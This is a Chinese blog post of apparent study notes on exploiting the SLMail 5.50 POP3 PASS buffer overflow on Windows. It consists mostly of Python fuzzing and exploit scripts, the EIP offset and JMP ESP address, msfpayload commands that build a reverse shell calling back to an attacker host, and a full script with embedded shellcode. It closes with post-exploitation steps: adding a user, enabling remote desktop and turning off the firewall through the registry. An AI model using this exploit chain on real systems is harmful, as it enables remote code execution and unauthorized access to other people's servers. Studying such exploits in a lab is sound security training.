<!DOCTYPE html>
<html lang="zh-CN">





<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
  <link rel="icon" type="image/png" href="/img/default.png">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="Tomas">
  <meta name="keywords" content="">
  <title>Kali Linux笔记(二十七)：Window缓冲区溢出 - Tomas&#39;Blog</title>

  <link  rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css" />
<link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
<link  rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css" />
<link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css" />
<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">


  <link  rel="stylesheet" href="/lib/prettify/tomorrow.min.css" />

<link  rel="stylesheet" href="/css/main.css" />


  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />


<!-- 自定义样式保持在最底部 -->


</head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>Tomas'Blog</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/about/">首页</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/archives/">归档</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/categories/">分类</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/tags/">标签</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/links/">友链</a>
          </li>
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="view intro-2" id="background" parallax=true
         style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask rgba-black-light flex-center">
          <div class="container text-center white-text fadeInUp">
            <span class="h2" id="subtitle">
              
            </span>

            
              
                <p class="mt-3 post-meta">
                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
                  星期三, 十二月 11日 2019, 1:03 下午
                </p>
              

              <p class="mt-1">
                
                  
                  <span class="post-meta">
                    <i class="far fa-chart-bar"></i>
                    2.8k 字
                  </span>
                

                
                  
                  <span class="post-meta">
                      <i class="far fa-clock"></i>
                      13 分钟
                  </span>
                

                
                  <!-- 不蒜子统计文章PV -->
                  
                  <span id="busuanzi_container_page_pv" class="post-meta" style="display: none">
                    <i class="far fa-eye" aria-hidden="true"></i>
                    <span id="busuanzi_value_page_pv"></span> 次
                  </span>
                
              </p>
            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5 z-depth-3" id="board">
          <div class="post-content mx-auto" id="post">
            
              <p
                class="note note-warning">本文最后更新于：星期日, 一月 5日 2020, 10:50 上午</p>
            
            <div class="markdown-body">
              <hr>
<h4 id="1-FUZZER（window缓存区溢出）"><a href="#1-FUZZER（window缓存区溢出）" class="headerlink" title="1. FUZZER（window缓存区溢出）"></a>1. FUZZER（window缓存区溢出）</h4><ul>
<li>SLMail 5.50 Mail Server（默认安装，About NT User Import，no instead）</li>
<li>ImmunityDebugger_1_85_setup.exe（要安装python2.7版本，不可3.0）</li>
<li>mona.py（Github上下载）</li>
</ul>
<blockquote>
<pre><code>window上看开启的服务
1.netstat -nao（cmd）
2.services.msc（允许win+R）</code></pre></blockquote>
<blockquote>
<pre><code>mona.py放在ImmunityDebugger中
右键 → 查找目标 → PyCommonds → 拷贝mona.py</code></pre></blockquote>
<h4 id="2-FUZZER"><a href="#2-FUZZER" class="headerlink" title="2. FUZZER"></a>2. FUZZER</h4><ul>
<li>SLMail 5.50 Mail Server（不同端口开的不同服务，都有不同指令可以向服务器提交数据）<ul>
<li>POP3 PASS命令存在缓存区溢出漏洞（nc SMTP or POP3,shell code进行试探)</li>
<li>无需身份验证实现远程代码执行</li>
<li>DEP：阻止代码从数据页被执行（CPU特性，通过操作系统软硬件实现，可绕过DEP）</li>
<li>ALSA：随机内存地址加载执行程序盒DDL，每次重启地址变化（动态内存地址分配，通过shell直接跳转到固定的内存地址，操作系统实现，在window vista之后加入）</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>在Kali端，向右键服务器发送大量命令组合的字符串（如：USER;ls）
在window xp端，用ImmunityDebugger查看在发送命令时是否会出现缓冲区溢出</code></pre></blockquote>
<h4 id="3-POP3"><a href="#3-POP3" class="headerlink" title="3. POP3"></a>3. POP3</h4><ul>
<li>nc IP地址 110端口</li>
<li>了解未知协议<ul>
<li>Wireshark（抓包分析学习）</li>
<li>标准RFC（查询协议的参数，进行学习）</li>
</ul>
</li>
<li><strong><code>🔺命令：./01.py</code></strong>（测试是否能连接POP3服务器）</li>
</ul>
<pre><code>#!/usr/bin/python
import socket
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
try:
    print &quot;\nSending evil buffer...&quot;
    s.connect((&#39;IP地址&#39;,110))
    data=s.recv(1024)
    print data

    s.send(&#39;USER yuanfh&#39;+&#39;\r\n&#39;)
    data=s.recv(1024)
    print data

    s.send(&#39;PASS test\r\n&#39;)
    data=s.recv(1024)
    print data

    s.close()
    print &quot;\nDone!&quot;

except:
    print &quot;Could not connect to POP3!&quot;</code></pre><h4 id="4-FUZZING"><a href="#4-FUZZING" class="headerlink" title="4. FUZZING"></a>4. FUZZING</h4><ul>
<li>测试PASS命令接收到大量数据是否会溢出（需要发送的数据大于缓冲区）</li>
<li>EIP寄存器存放下一条指令的地址（首先关注EIP，ESP，EDP，可使指向shell code的地址）</li>
<li><strong><code>🔺命令：./02.py</code></strong></li>
</ul>
<pre><code>#!/usr/bin/python
import socket

buffer=[&#39;A&#39;]
counter=100
while len(buffer)&lt;=50:
    buffer.append(&quot;A&quot;*counter)
    counter=counter+200
for string in buffer:
    print &quot;Fuzzing PASS with %s bytes&quot;%len(string)
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    connect=s.connect((&#39;IP地址&#39;,110))
    s.recv(1024)
    s.send(&#39;USER test&#39;+&#39;\r\n&#39;)
    s.recv(1024)
    s.send(&#39;PASS &#39;+string+&#39;\r\n&#39;)
    s.send(&#39;QUIT\r\n&#39;)
    s.close()</code></pre><blockquote>
<pre><code>ImmunityDebugger调试（记录程序的运行状态，为中间数据的拦截、记录）：
1.Open → 打开一个静态的exe文件
2.Attack → 正在运行的程序（通过PID区attack，attack会使进程停止，需点击开始）</code></pre></blockquote>
<h4 id="5-FUZZING"><a href="#5-FUZZING" class="headerlink" title="5. FUZZING"></a>5. FUZZING</h4><ul>
<li>2700个字符实现EIP寄存器溢出</li>
<li><strong><code>🔺命令：./03.py</code></strong></li>
</ul>
<pre><code>#!/usr/bin/python
import socket

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
buffer=&#39;A&#39;*2700
try:
    print &quot;\nSending evil buffer...&quot;
    s.connect((&quot;IP地址&quot;,110))
    data=s.recv(1024)
    s.send(&#39;USER test&#39;+&#39;\r\n&#39;)
    data=s.recv(1024)
    s.send(&#39;PASS&#39;+buffer+&#39;\r\n&#39;)
    print &quot;\nDone!&quot;
except:
    print &quot;Could not connect to POP3!&quot;</code></pre><ul>
<li>找到精确溢出的4个字节<ul>
<li>二分法</li>
<li>唯一字串法</li>
<li><strong><code>🔺命令：./usr/share/metasploit-framwork/tools/exploit/pattern_create.rb -l 2700</code></strong></li>
<li><strong><code>🔺命令：./pattern_offset.rb EIP的4个十六进制数字</code></strong>（通过工具找到位置）</li>
<li><strong><code>🔺命令：./04.py</code></strong></li>
</ul>
</li>
</ul>
<pre><code>#!/usr/bin/python
import socket

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
buffer=&#39;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9&#39;
try:
    print &quot;\nSending evil buffer...&quot;
    s.connect((&quot;IP地址&quot;,110))
    data=s.recv(1024)
    s.send(&#39;USER test&#39;+&#39;\r\n&#39;)
    data=s.recv(1024)
    s.send(&#39;PASS&#39;+buffer+&#39;\r\n&#39;)
    print &quot;\nDone!&quot;
except:
    print &quot;Could not connect to POP3!&quot;</code></pre><ul>
<li>找到精确溢出的4个字节<ul>
<li><strong><code>🔺命令：./05.py</code></strong></li>
</ul>
</li>
</ul>
<pre><code>#!/usr/bin/python
import socket

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
buffer=&#39;A&#39;*2607+&#39;B&#39;*4+&#39;C&#39;*20
try:
    print &quot;\nSending evil buffer...&quot;
    s.connect((&quot;IP地址&quot;,110))
    data=s.recv(1024)
    s.send(&#39;USER test&#39;+&#39;\r\n&#39;)
    data=s.recv(1024)
    s.send(&#39;PASS&#39;+buffer+&#39;\r\n&#39;)
    print &quot;\nDone!&quot;
except:
    print &quot;Could not connect to POP3!&quot;</code></pre><blockquote>
<pre><code>window系统为小端存储形式，低位高地址，高位低地址
EIP为4个十六进制的数字，可通过ASCII换算成字符串
ESP存放着EIP溢出的内容，可以填放shell code作为远程执行代码</code></pre></blockquote>
<h4 id="6-FUZZING"><a href="#6-FUZZING" class="headerlink" title="6. FUZZING"></a>6. FUZZING</h4><ul>
<li>思路：<ul>
<li>将EIP修改为Shellcode代码的内存地址，将Shellcode写入到该地址空间，程序读取EIP寄存器数值，将跳转到Shellcode代码段并执行</li>
</ul>
</li>
<li>寻找可存放Shellcode的内容空间</li>
<li><strong><code>🔺命令：./06.py</code></strong>（查看ESP寄存器可存放多少个字符）</li>
</ul>
<pre><code>#!/usr/bin/python
import socket

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
buffer=&#39;A&#39;*2607+&#39;B&#39;*4+&#39;C&#39;*(3500-2607-4)
try:
    print &quot;\nSending evil buffer...&quot;
    s.connect((&quot;IP地址&quot;,110))
    data=s.recv(1024)
    s.send(&#39;USER test&#39;+&#39;\r\n&#39;)
    data=s.recv(1024)
    s.send(&#39;PASS&#39;+buffer+&#39;\r\n&#39;)
    print &quot;\nDone!&quot;
except:
    print &quot;Could not connect to POP3!&quot;</code></pre><h4 id="7-FUZZING"><a href="#7-FUZZING" class="headerlink" title="7. FUZZING"></a>7. FUZZING</h4><ul>
<li>不同类型的程序、协议、漏洞，会将某些字符认为是坏字符，这些字符有固定用途<ul>
<li>返回地址、Shellcode、buffer中都不能出现坏字符</li>
<li>null byte（0x00）空字符，用于终止字符串拷贝的操作</li>
<li>return（0x0D）回车操作，表示POP3 PASS命令输入完成</li>
<li>思路：发送0x00–0xff 256个字符，查找所有的坏字符</li>
<li><strong><code>🔺命令：./07.py</code></strong>（查找坏字符）</li>
<li>0x0A（导致后面数据无法出现）</li>
<li>0x0D（被过滤）</li>
<li>0x00（被过滤）</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>字符传进寄存器，可能会被过滤，也可能使服务端carsh</code></pre></blockquote>
<pre><code>#!/usr/bin/python
import socket

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
badchars={}
buffer=&#39;A&#39;*2607+&#39;B&#39;*4+badchars
try:
    print &quot;\nSending evil buffer...&quot;
    s.connect((&quot;IP地址&quot;,110))
    data=s.recv(1024)
    s.send(&#39;USER test&#39;+&#39;\r\n&#39;)
    data=s.recv(1024)
    s.send(&#39;PASS&#39;+buffer+&#39;\r\n&#39;)
    print &quot;\nDone!&quot;
except:
    print &quot;Could not connect to POP3!&quot;</code></pre><h4 id="8-FUZZING"><a href="#8-FUZZING" class="headerlink" title="8. FUZZING"></a>8. FUZZING</h4><ul>
<li>重定向数据流<ul>
<li>用ESP的地址替换EIP的值</li>
<li>但是ESP地址变化，硬编码不可行（每次操作系统随机分配）</li>
<li>SLMail线程应用程序，操作系统为每个线程分配一段地址范围，每个线程地址范围使不确定的</li>
</ul>
</li>
<li>变通思路<ul>
<li>在内存中寻找地址固定的系统模块</li>
<li>在模块中寻找JMP ESP指定的地址跳转，再由该指令间接跳转到ESP，从而执行Shellcode</li>
<li>mono.py脚本识别内存模块，搜索”return address”是JMP ESP指令的模块</li>
<li>寻找无DEP、ALSR保护的内存地址</li>
<li>内存地址不包含坏字符</li>
</ul>
</li>
</ul>
<h4 id="9-FUZZING"><a href="#9-FUZZING" class="headerlink" title="9. FUZZING"></a>9. FUZZING</h4><ul>
<li>寻找不受保护的系统模块<ul>
<li>!mona modules</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>Rebase：操作系统重启，内存地址是否发生变化，基地址变化，为False
SafeSEH、ASLR：操作系统提供的内存保护机制，为False
OS DLL：操作系统自带的动态链接库，为True</code></pre></blockquote>
<ul>
<li>将汇编指令JMP ESP转换为二进制<ul>
<li><strong><code>🔺命令：./nasm shell</code></strong></li>
<li>FFE4</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code> msf脚本工具：
 /usr/share/metasploit-framwork/tools/nasm_shell rb（汇编语言转换为二进制）</code></pre></blockquote>
<ul>
<li>在模块中搜索FFE4指令<ul>
<li>！mona find -s “\xFF\xE4”(JMP ESP对应的二进制指令) -m openc32.dll</li>
<li>！mona find -s “\xFF\xE4”(JMP ESP对应的二进制指令) -m mfc42.dll</li>
<li>！mona find -s “\xFF\xE4”(JMP ESP对应的二进制指令) -m slmfc.dll</li>
<li>选择不包含坏字符的内存地址</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>切换汇编语言表示形式：Disassemble
Memory Map内存地址图查看模块对应的基地址是否收到DEP,ALSR的保护，是否需要绕过
▲绕过DEP的一种方法：Menmory Map中的对应的基址的Pocess需为（RE可读可执行）</code></pre></blockquote>
<ul>
<li>在该地址设置断点<ul>
<li>设置断点：右键 → BreakPoint → Memory on acess</li>
<li>Debug → Step info单步执行</li>
</ul>
</li>
<li>重发buffer（小端存储 → 地址完全翻转）<ul>
<li><strong><code>🔺命令：./08.py</code></strong>（查看模块指令的地址是否为ESP的地址）</li>
</ul>
</li>
</ul>
<pre><code>#!/usr/bin/python
import socket

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
buffer=&#39;A&#39;*2607+&#39;\x8f\x35\x4a\x5f&#39;+&#39;C&#39;*390
try:
    print &quot;\nSending evil buffer...&quot;
    s.connect((&quot;IP地址&quot;,110))
    data=s.recv(1024)
    s.send(&#39;USER test&#39;+&#39;\r\n&#39;)
    data=s.recv(1024)
    s.send(&#39;PASS&#39;+buffer+&#39;\r\n&#39;)
    print &quot;\nDone!&quot;
except:
    print &quot;Could not connect to POP3!&quot;</code></pre><h4 id="10-FUZZING"><a href="#10-FUZZING" class="headerlink" title="10. FUZZING"></a>10. FUZZING</h4><ul>
<li>生成Shellcode（注意坏字符）</li>
<li>Scratch（写Shellcode的工具）</li>
<li>cd /usr/share/framework2</li>
<li><strong><code>🔺命令：./msfpayload -l</code></strong></li>
<li><strong><code>🔺命令：./msfpayload win32_reverse LHOST=反向IP地址 LPORT=反向端口 C</code></strong></li>
<li><strong><code>🔺命令：./msfpayload win32_reverse LHOST=IP地址 LPORT=443 R | ./msfencode -b &quot;\x00\x0a\x0d&quot;</code></strong>（最后需要用”+”进行连接）</li>
</ul>
<blockquote>
<pre><code>win32_adduser 增加用户的Shellcode
win32_bind    增加监听的进程，可以开启相应的端口
▲ 正向的bind基本上会被防火墙过滤
▲ 反向（reserver）的bind，服务端会开放端口，主动连接外部网络
▲ msfencode可对Shellcode做免杀，也可以编掉坏字符，进行编码需要指定原始格式 R</code></pre></blockquote>
<ul>
<li>**`🔺命令：nc -vlp 443</li>
<li><strong><code>🔺命令：./09.py</code></strong>（脚本后门）</li>
</ul>
<pre><code>#!/usr/bin/python
import socket

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
shellcode=(
&quot;\x6a\x48\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x7c\xac\x3f&quot;+
&quot;\xac\x83\xeb\xfc\xe2\xf4\x80\xc6\xd4\xe1\x94\x55\xc0\x53\x83\xcc&quot;+
&quot;\xb4\xc0\x58\x88\xb4\xe9\x40\x27\x43\xa9\x04\xad\xd0\x27\x33\xb4&quot;+
&quot;\xb4\xf3\x5c\xad\xd4\xe5\xf7\x98\xb4\xad\x92\x9d\xff\x35\xd0\x28&quot;+
&quot;\xff\xd8\x7b\x6d\xf5\xa1\x7d\x6e\xd4\x58\x47\xf8\x1b\x84\x09\x49&quot;+
&quot;\xb4\xf3\x58\xad\xd4\xca\xf7\xa0\x74\x27\x23\xb0\x3e\x47\x7f\x80&quot;+
&quot;\xb4\x25\x10\x88\x23\xcd\xbf\x9d\xe4\xc8\xf7\xef\x0f\x27\x3c\xa0&quot;+
&quot;\xb4\xdc\x60\x01\xb4\xec\x74\xf2\x57\x22\x32\xa2\xd3\xfc\x83\x7a&quot;+
&quot;\x59\xff\x1a\xc4\x0c\x9e\x14\xdb\x4c\x9e\x23\xf8\xc0\x7c\x14\x67&quot;+
&quot;\xd2\x50\x47\xfc\xc0\x7a\x23\x25\xda\xca\xfd\x41\x37\xae\x29\xc6&quot;+
&quot;\x3d\x53\xac\xc4\xe6\xa5\x89\x01\x68\x53\xaa\xff\x6c\xff\x2f\xef&quot;+
&quot;\x6c\xef\x2f\x53\xef\xc4\xbc\x04\x5b\xc6\x1a\xc4\x3e\x17\x1a\xff&quot;+
&quot;\xb6\x4d\xe9\xc4\xd3\x55\xd6\xcc\x68\x53\xaa\xc6\x2f\xfd\x29\x53&quot;+
&quot;\xef\xca\x16\xc8\x59\xc4\x1f\xc1\x55\xfc\x25\x85\xf3\x25\x9b\xc6&quot;+
&quot;\x7b\x25\x9e\x9d\xff\x5f\xd6\x39\xb6\x51\x82\xee\x12\x52\x3e\x80&quot;+
&quot;\xb2\xd6\x44\x07\x94\x07\x14\xde\xc1\x1f\x6a\x53\x4a\x84\x83\x7a&quot;+
&quot;\x64\xfb\x2e\xfd\x6e\xfd\x16\xad\x6e\xfd\x29\xfd\xc0\x7c\x14\x01&quot;+
&quot;\xe6\xa9\xb2\xff\xc0\x7a\x16\x53\xc0\x9b\x83\x7c\x57\x4b\x05\x6a&quot;+
&quot;\x46\x53\x09\xa8\xc0\x7a\x83\xdb\xc3\x53\xac\xc4\xcf\x26\x78\xf3&quot;+
&quot;\x6c\x53\xaa\x53\xef\xac&quot;)
buffer=&#39;A&#39;*2607+&#39;\x8f\x35\x4a\x5f&#39;+&#39;\x90&#39;*8+shellcode
try:
    print &quot;\nSending evil buffer...&quot;
    s.connect((&quot;IP地址&quot;,110))
    data=s.recv(1024)
    s.send(&#39;USER test&#39;+&#39;\r\n&#39;)
    data=s.recv(1024)
    s.send(&#39;PASS&#39;+buffer+&#39;\r\n&#39;)
    print &quot;\nDone!&quot;
except:
    print &quot;Could not connect to POP3!&quot;</code></pre><blockquote>
<pre><code>汇编语言的\0x90，表示NOP（不操作），为了保证Shellcode运行有效性，从经验上来谈，CPU在跳转解析的时候，可能会擦除，覆盖Shellcode的前几个字符，所以需要加NOP进行不操作</code></pre></blockquote>
<h4 id="11-FUZZING"><a href="#11-FUZZING" class="headerlink" title="11. FUZZING"></a>11. FUZZING</h4><ul>
<li>早期的msfpayload<ul>
<li>Shellcode执行后会一ExitProcess方式退出整个进程，将导致邮件服务崩溃</li>
<li>SLMail是一个基于线程的应用，适用ExitThread方式可以避免整个系统崩溃，可实现重复溢出</li>
<li><strong><code>🔺命令：./msfpayload win32_reverser LHOST=反向IP地址 EXITFUNC=thread LPORT=443 R | ./msfencode -b &quot;\x00\x0a\x0d&quot;</code></strong></li>
</ul>
</li>
</ul>
<h4 id="12-FUZZING"><a href="#12-FUZZING" class="headerlink" title="12. FUZZING"></a>12. FUZZING</h4><blockquote>
<pre><code>1.修改注册表开启远程桌面控制后需重启计算机（shutdown -r -t 0）
2.查看远程桌面是否开启（我的电脑 → 属性 → 远程）
3.apt-get install rdesktop
4.rdesktop 远程IP
5.nc -vlp 443 
6.增加用户（net user 用户 密码 /add）
▲ 可以通过注册表关闭防火墙（regsnap可抓取注册表变化）</code></pre></blockquote>

            </div>
            <hr>
            <div>
              <p>
                
                  <span>
                <i class="iconfont icon-inbox"></i>
                    
                      <a class="hover-with-bg" href="/categories/Kali/">Kali</a>
                      &nbsp;
                    
                  </span>&nbsp;&nbsp;
                
                
                  <span>
                <i class="iconfont icon-tag"></i>
                    
                      <a class="hover-with-bg" href="/tags/%E5%AE%89%E5%85%A8/">安全</a>
                    
                  </span>
                
              </p>
              
                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" target="_blank" rel="nofollow noopener noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
              
              
                <div class="post-prevnext row">
                  <div class="post-prev col-6">
                    
                    
                      <a href="/2019/12/13/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%8C%E5%8D%81%E5%85%AB)%EF%BC%9ALinux%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/">
                        <i class="fa fa-chevron-left"></i>
                        <span class="hidden-mobile">Kali Linux笔记(二十八)：Linux缓冲区溢出</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </div>
                  <div class="post-next col-6">
                    
                    
                      <a href="/2019/12/11/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%8C%E5%8D%81%E5%85%AD)%EF%BC%9A%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E4%BB%8B%E7%BB%8D/">
                        <span class="hidden-mobile">Kali Linux笔记(二十六)：缓冲区溢出介绍</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="fa fa-chevron-right"></i>
                      </a>
                    
                  </div>
                </div>
              
            </div>

              
          </div>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc-start"></div>
<div id="toc">
